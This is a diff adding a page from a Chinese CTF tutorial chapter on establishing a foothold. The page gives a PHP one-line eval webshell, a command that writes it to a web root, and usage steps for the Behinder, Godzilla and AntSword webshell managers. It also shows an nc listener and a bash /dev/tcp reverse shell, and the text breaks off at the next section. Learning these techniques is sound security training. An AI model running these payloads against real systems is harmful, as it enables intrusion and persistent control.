@@ -1,0 +1,1494 @@
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+    <title>立足点建立 | Hello CTF</title>
+  
+  <meta name="description" content="开源免费、新手友好的CTF(Capture The Flag,夺旗赛)入门教程">
+  <link rel="icon" href="../../assets/images/favicon.png">
+
+  <!-- 字体（与首页同源） -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+SC:wght@400;500;700;800&display=swap" rel="stylesheet">
+
+  <!-- material 文章排版 CSS（pin 9.7.7 的 hash 文件名，升级主题时同步更新） -->
+  <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+  <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+
+  <!-- Hello-CTF 外壳 -->
+  <link rel="stylesheet" href="../../shell/shell.css">
+  <link rel="stylesheet" href="../../shell/shell-docs.css">
+  <link rel="stylesheet" href="../../shell/shell-article.css">
+
+  <!-- 站点原有 extra_css（katex CDN / extra.css / bannerSlider.css 等） -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+  
+    <link rel="stylesheet" href="../../stylesheets/extra.css">
+  
+
+  <!-- admonition 等组件的图标 SVG 变量（原由 material base.html 注入） -->
+  
+
+
+
+  
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-V9998CDNR1"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-V9998CDNR1",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-V9998CDNR1",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+</head>
+<body data-md-color-scheme="default">
+
+  <!-- 主题初始化（先于渲染，避免闪烁）：hc-theme → shell data-theme + material slate -->
+  <script>
+    (function () {
+      var t = null;
+      try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+      if (t) {
+        document.documentElement.dataset.theme = t;
+        document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+      }
+    })();
+    window.__md_palette_sync = function (t) {
+      document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+    };
+  </script>
+
+  <script src="../../shell/search.js"></script>
+  <script src="../../shell/shell.js"></script>
+  <script>Shell.mount({ active: "" });</script>
+
+  <!-- 主区：顶部文档导航 + 文章 + TOC -->
+  <div class="main">
+    <nav class="hc-topnav" aria-label="文档导航">
+      <div class="hc-topnav-inner">
+        
+          
+          
+            <a class="tn-item tn-single" href="../../hc-start/"><svg class="ic tn-ico"><use href="#i-book"/></svg>快速开始</a>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-book"/></svg>前言<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-preface/">前言</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/about/">关于本书</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/usage/">食用方法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/join/">加入我们</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-puzzle"/></svg>MISC<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-misc/">MISC | 杂项</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/osint/">信息收集</a>
+    
+  
+    
+      <div class="tn-group">文件与编码基础</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/Encode_extra/">编码扩展</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file/">文件基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Archivefile/">压缩包</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">隐写分析</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/stego/">图片隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_stego/">文件隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/audio_stego/">音频隐写</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">取证分析</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/pcap/">流量分析</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/memory/">内存取证</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/industrial/">工控类</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_sign/">附:文件签名表</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item on">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-globe"/></svg>Web<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../">Web | 网络攻防</a>
+    
+  
+    
+      <div class="tn-group">环境与工具</div>
+      
+  
+    
+      <a class="tn-link" href="../web_env/">Web环境设置</a>
+    
+  
+    
+      <a class="tn-link" href="../docker_install/">Docker安装配置</a>
+    
+  
+    
+      <a class="tn-link" href="../docker_env/">Docker与漏洞环境</a>
+    
+  
+    
+      <a class="tn-link" href="../vm_lab/">虚拟机与网络模拟</a>
+    
+  
+    
+      <a class="tn-link" href="../burp/">Burp Suite</a>
+    
+  
+    
+      <a class="tn-link" href="../py_script/">Python脚本</a>
+    
+  
+    
+      <a class="tn-link" href="../http/">HTTP协议</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../web_start/">Web入门题单</a>
+    
+  
+    
+      <div class="tn-group">信息收集</div>
+      
+  
+    
+      <a class="tn-link" href="../sensitive_info/">敏感信息泄露</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">PHP专题</div>
+      
+  
+    
+      <a class="tn-link" href="../php_features/">PHP特性与常见绕过</a>
+    
+  
+    
+      <a class="tn-link" href="../php_basic/">PHP基础</a>
+    
+  
+    
+      <a class="tn-link" href="../php_unser/">PHP反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../php_code_audit/">PHP代码审计</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">注入类漏洞</div>
+      
+  
+    
+      <a class="tn-link" href="../sql_injection/">SQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../nosql/">NoSQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xss/">XSS攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../csrf/">CSRF攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../ssti/">SSTI注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xxe/">XXE注入</a>
+    
+  
+    
+      <a class="tn-link" href="../ssrf/">SSRF注入</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">文件类漏洞</div>
+      
+  
+    
+      <a class="tn-link" href="../file_upload/">文件上传</a>
+    
+  
+    
+      <a class="tn-link" href="../include/">文件包含</a>
+    
+  
+    
+      <a class="tn-link" href="../dir_traversal/">目录穿越</a>
+    
+  
+    
+      <a class="tn-link" href="../any_file_read/">任意文件读取</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">命令与代码执行</div>
+      
+  
+    
+      <a class="tn-link" href="../rce/">RCE</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../session_jwt/">会话与认证安全</a>
+    
+  
+    
+      <a class="tn-link" href="../logical_vuln/">逻辑漏洞</a>
+    
+  
+    
+      <div class="tn-group">语言扩展 | 世界不止有PHP</div>
+      
+  
+    
+      <a class="tn-link" href="../py_unser/">Python反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../py_sandbox/">Python沙箱逃逸</a>
+    
+  
+    
+      <a class="tn-link" href="../flask_sec/">Flask安全</a>
+    
+  
+    
+      <a class="tn-link" href="../prototype_pollution/">原型链污染</a>
+    
+  
+    
+      <a class="tn-link" href="../js_sandbox/">JS沙箱逃逸</a>
+    
+  
+    
+      <a class="tn-link" href="../js_reverse/">JS逆向</a>
+    
+  
+    
+      <a class="tn-link" href="../java_basic/">Java安全基础</a>
+    
+  
+    
+      <a class="tn-link" href="../java_unser/">Java反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../spring/">Spring漏洞</a>
+    
+  
+    
+      <a class="tn-link" href="../java_audit/">Java代码审计</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">进阶专题</div>
+      
+  
+    
+      <a class="tn-link" href="../waf_bypass/">WAF绕过</a>
+    
+  
+    
+      <a class="tn-link" href="../http_smuggling/">请求走私</a>
+    
+  
+    
+      <a class="tn-link" href="../cache_poisoning/">缓存投毒</a>
+    
+  
+    
+      <a class="tn-link" href="../xs_leaks/">XS-Leaks</a>
+    
+  
+    
+      <a class="tn-link" href="../web_crypto/">密码学应用题</a>
+    
+  
+    
+      <a class="tn-link" href="../cloud_container/">云与容器安全</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">实战能力</div>
+      
+  
+    
+      <div class="tn-group">渗透链路基础</div>
+      
+  
+    
+      <a class="tn-link" href="../pentest_flow/">渗透流程总览</a>
+    
+  
+    
+      <a class="tn-link" href="../two_layer/">两层网络实战</a>
+    
+  
+    
+      <a class="tn-link on" href="./">立足点建立</a>
+    
+  
+    
+      <a class="tn-link" href="../internal_recon/">内网信息收集</a>
+    
+  
+    
+      <a class="tn-link" href="../proxy_tunnel/">代理与隧道</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">多层网络渗透</div>
+      
+  
+    
+      <a class="tn-link" href="../three_layer/">三层网络实战</a>
+    
+  
+    
+      <a class="tn-link" href="../multi_layer/">多层网络综合</a>
+    
+  
+    
+      <a class="tn-link" href="../ad_basic/">域渗透入门</a>
+    
+  
+    
+      <a class="tn-link" href="../lateral/">横向移动</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">对抗与综合</div>
+      
+  
+    
+      <a class="tn-link" href="../awd/">AWD模式</a>
+    
+  
+    
+      <a class="tn-link" href="../web_pwn/">Web与二进制结合</a>
+    
+  
+    
+      <a class="tn-link" href="../nday/">Nday利用</a>
+    
+  
+    
+      <a class="tn-link" href="../review/">Writeup复盘方法</a>
+    
+  
+
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-lock"/></svg>Crypto<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-crypto/">Crypto | 密码学</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/env/">环境配置</a>
+    
+  
+    
+      <div class="tn-group">基础知识</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Recap/">前情提要</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Encode/">编码基础</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">密码体系</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Classicalcipher/">古典密码</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Moderncipher/">现代密码</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-cpu"/></svg>Reverse<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-reverse/">逆向工程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%95%E5%AF%BC%E7%AF%87%EF%BC%9A%E7%81%B5%E9%AD%82FAQ/">引导篇：灵魂FAQ</a>
+    
+  
+    
+      <div class="tn-group">编译与可执行文件</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/">C语言基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/">存储结构</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9A%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/">可执行文件</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">交互式反汇编工具IDA</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/StartWithIDA/">从零开始的IDA</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/">IDA动态调试</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">常见算法</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97/">基本运算</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%97%E8%8A%82%E6%B5%81%E7%AE%97%E6%B3%95/">字节流算法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/">分组密码</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/z3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/">z3约束求解</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9AASM%E6%B1%87%E7%BC%96/">x86 汇编初步</a>
+    
+  
+    
+      <div class="tn-group">代码保护与对抗</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%8A%B1%E6%8C%87%E4%BB%A4/">花指令</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A3%B3/">加壳</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/VM/">VM</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/SMC/">SMC</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/">异常处理</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">多线程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/">TLS回调函数</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%8F%8D%E8%B0%83%E8%AF%95/">反调试</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/">控制流平坦化</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">符号执行</a>
+    
+  
+    
+      <div class="tn-group">语言与框架</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Python/">Python</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/NET/">.NET</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Rust/">Rust</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/JavaScript/">JavaScript</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Android/">Android平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/">解题技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-terminal"/></svg>Pwn<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-pwn/">Pwn | 二进制安全</a>
+    
+  
+    
+      <div class="tn-group">环境与基础</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/wsl2_environment/">wsl2下的环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Asm_x86/">汇编语言(x86)</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Protections/">常见保护</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">栈溢出</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Stack_Overflow/">栈上数组越界&栈溢出</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">ROP利用</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP/">ROP入门</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP_Tricks/">常见的ROP技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/rop_add_v1/">ROP进阶</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-shield"/></svg>AWD<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_about/">AWD介绍</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_platform/">AWD平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_web.exp/">【WEB】AWD技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_pwn.exp/">【PWN】AWD技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-bot"/></svg>AI<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-ai/">AI | 人工智能</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/What_is_AI/">初识AI</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/MLP/">你的第一个神经网络</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-link"/></svg>区块链<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <div class="tn-group">Move</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x00/">从0开始的签到题</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x01/">独特的所有权</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x02/">神奇的时钟</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x03/">对象与燃气</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x04/">多样的泛型</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-tag"/></svg>附录<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-appendix/how-to-ask/">提问的智慧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/NSSCTF_Usage/">NSSCTF平台使用</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/book/">推荐书单</a>
+    
+  
+</div>
+            </div>
+          
+        
+      </div>
+    </nav>
+    <div class="doc-layout">
+      <article class="md-typeset hc-article">
+        <!-- Tags -->
+
+
+<!-- Actions -->
+<!-- Actions -->
+
+
+  <!-- Edit button -->
+  
+
+  <!-- View button -->
+  
+
+
+<!-- Page content -->
+<div><h1 id="_1">立足点建立<a class="headerlink" href="#_1" title="Permanent link">¶</a></h1>
+<p>拿到 RCE 或文件上传的利用点之后，下一个问题往往是：怎么把这个"能执行一次命令"的能力，变成一个稳定、可反复使用的立足点（foothold）。本章讲三件事：把 webshell 落地到目标上、把 shell 反弹回自己的机器、以及让权限在重启或清理后仍然活着。最后简单聊聊免杀的基本概念，以及在 CTF 的 AWD 赛制里这些手段该如何取舍。</p>
+<blockquote>
+<p>前置阅读：如果还没搞定"怎么执行命令"，先看「文件上传」和「RCE」两章；本章假设你已经能在目标上写文件或执行命令。</p>
+</blockquote>
+<h2 id="webshell">Webshell 落地<a class="headerlink" href="#webshell" title="Permanent link">¶</a></h2>
+<p>webshell 的本质是"一个能通过 HTTP 反复触发命令执行的脚本文件"。选型的核心问题是：<strong>流量要不要加密、功能要多全、文件要小到什么程度</strong>。</p>
+<h3 id="_2">一句话木马<a class="headerlink" href="#_2" title="Permanent link">¶</a></h3>
+<p>最小形态，PHP 里就是一个 <code>eval</code> 或 <code>assert</code>：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div>
+<p>写入方式视利用点而定：</p>
+<ul>
+<li>文件上传漏洞：直接上传，或在文件头里拼接图片内容绕过 content-type 检查（详见「文件上传」一章）。</li>
+<li>RCE：用命令写文件，例如 <code>echo '&lt;?php @eval($_POST[cmd]);?&gt;' &gt; /var/www/html/shell.php</code>。注意 shell 里 <code>$</code> 和引号的转义，用单引号包裹最省心。</li>
+<li>文件包含 + 日志 poisoning 等场景：让包含点把代码落到可访问路径。</li>
+</ul>
+<p>优点是文件极小、随处可写；缺点是流量明文，参数名 <code>cmd=system('id');</code> 这样的内容在 WAF 眼里等于自首，而且功能只有"执行一行代码"。</p>
+<p><strong>基本使用</strong>：直接用蚁剑/菜刀类客户端连，或者手动发请求验证：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>curl<span class="w"> </span>-d<span class="w"> </span><span class="s1">'cmd=system("id");'</span><span class="w"> </span>http://target/shell.php
+</code></pre></div>
+<h3 id="behinder">冰蝎（Behinder）<a class="headerlink" href="#behinder" title="Permanent link">¶</a></h3>
+<p>冰蝎的定位是 <strong>流量加密型 webshell</strong>。客户端与服务端约定一个密钥，payload 用 AES 加密后再传输， Wireshark 里看到的是一串看不出结构的密文，静态特征和流量特征都大幅弱化。</p>
+<p>基本使用流程：</p>
+<ol>
+<li>从 releases 拿到 <code>Behinder.jar</code>，<code>java -jar Behinder.jar</code> 启动（需要 Java 环境）。</li>
+<li>在 <code>server/</code> 目录里选对应语言的 shell（<code>shell.php</code> / <code>shell.jsp</code> / <code>shell.aspx</code>），通过上传或 RCE 落地到目标。</li>
+<li>客户端"新增"：填 URL，协议选 <code>default_aes</code>（v3 默认），保存后双击连接。</li>
+<li>连上后自带虚拟终端、文件管理、数据库操作，日常操作不需要再手写命令。</li>
+</ol>
+<p>冰蝎的 shell 文件本身有固定结构（密钥协商 + AES 解密 + 反射执行），特征库覆盖得很好，所以"原版文件直接传"在有杀软/查杀的场景下基本必死——这是后面免杀一节要解决的问题。</p>
+<h3 id="godzilla">哥斯拉（Godzilla）<a class="headerlink" href="#godzilla" title="Permanent link">¶</a></h3>
+<p>功能上与冰蝎同类，也是加密流量管理器，但插件生态更全：内置了常用的提权 EXP、内存马注入、数据库管理等模块，生成的 shell 支持多种加密器（AES、XOR 等）。</p>
+<p>基本使用与冰蝎几乎一样：</p>
+<ol>
+<li><code>java -jar godzilla.jar</code> 启动。</li>
+<li>「管理 → 生成」选择语言（PHP/JSP/ASPX）、加密器、密码，生成 shell 文件并落地到目标。</li>
+<li>「目标 → 添加」填 URL、密码、加密器，测试连接。</li>
+<li>进入后右键可加载插件，比如直接执行 mimikatz 类模块、注入内存马。</li>
+</ol>
+<h3 id="antsword">蚁剑（AntSword）<a class="headerlink" href="#antsword" title="Permanent link">¶</a></h3>
+<p>蚁剑是 <strong>开源的 webshell 管理器</strong>，本身不发明 shell，而是管理各种 shell（一句话、冰蝎 shell 都能挂进来）。它的价值在于跨平台、开源可改、编码器/解码器可自定义。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>添加数据：Shell 地址 = http://target/shell.php
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>连接密码 = cmd          # 一句话里 $_POST 的键名
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>编码器   = default / base64 / chr 等
+</code></pre></div>
+<p><code>default</code> 就是明文 POST；<code>base64</code> 会把 payload 编码一次，能过掉最 naive 的关键字匹配，但对认真做的 WAF 无效。</p>
+<h3 id="_3">怎么选<a class="headerlink" href="#_3" title="Permanent link">¶</a></h3>
+<p>CTF 场景下的实用排序：</p>
+<ul>
+<li>目标没有流量检测、只要快速干活：<strong>一句话 + 蚁剑</strong>，或者直接 curl，最省事。</li>
+<li>AWD 或有流量审计、需要不被对手从流量里抄走 shell：<strong>冰蝎/哥斯拉</strong>，流量加密后别人看到你的包也还原不出命令。</li>
+<li>需要提权、打内存马等进阶操作：<strong>哥斯拉</strong>，插件现成。</li>
+</ul>
+<p>三者不冲突，常见做法是先用一句话探路，确认能写能连后立刻换成冰蝎 shell。</p>
+<h2 id="shell">反弹 Shell<a class="headerlink" href="#shell" title="Permanent link">¶</a></h2>
+<h3 id="_4">为什么需要反弹<a class="headerlink" href="#_4" title="Permanent link">¶</a></h3>
+<p>webshell 是"请求-响应"模式：每执行一条命令都要发一个 HTTP 请求，交互性差，跑不了交互式程序。反弹 shell 的思路是让 <strong>目标主动连回攻击机</strong>，把 shell 的输入输出挂到这条 TCP 连接上。</p>
+<p>为什么要"反弹"而不是攻击机直接连目标（bind shell）？因为目标通常在内网/NAT/防火墙后面，入站连接根本到不了；而出站连接一般限制宽松得多。</p>
+<h3 id="_5">监听端配置<a class="headerlink" href="#_5" title="Permanent link">¶</a></h3>
+<p>攻击机上先用 <code>nc</code> 起一个监听：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
+<ul>
+<li><code>-l</code>：监听模式</li>
+<li><code>-v</code>：显示连接信息</li>
+<li><code>-n</code>：不做 DNS 解析</li>
+<li><code>-p 4444</code>：监听端口</li>
+</ul>
+<p>如果攻击机自己也在 NAT 后面（比如校园网），公网 VPS 上监听，或打一层内网穿透（<code>frp</code> 等），让目标能连到。</p>
+<p>拿到 shell 后第一时间升级成交互式 TTY，否则 <code>su</code>、<code>vim</code>、<code>Ctrl+C</code> 都用不了：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="c1"># 然后 Ctrl+Z 把 shell 挂到后台</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="p">;</span><span class="w"> </span><span class="nb">fg</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c1"># 回车恢复前台，再补一下</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div>
+<h3 id="bash">bash 版<a class="headerlink" href="#bash" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/10.0.0.1/4444<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div>
+<p>原理：bash 内建支持 <code>/dev/tcp/host/port</code> 伪设备，打开它即建立 TCP 连接；<code>&gt;&amp;</code> 把 stdout、stderr 重定向到连接，<code>0&gt;&amp;1</code> 再把 stdin 也接上去。最短最好用，但目标必须是 bash 且未禁用该特性。</p>
+<h3 id="nc">nc 版<a class="headerlink" href="#nc" title="Permanent link">¶</a></h3>
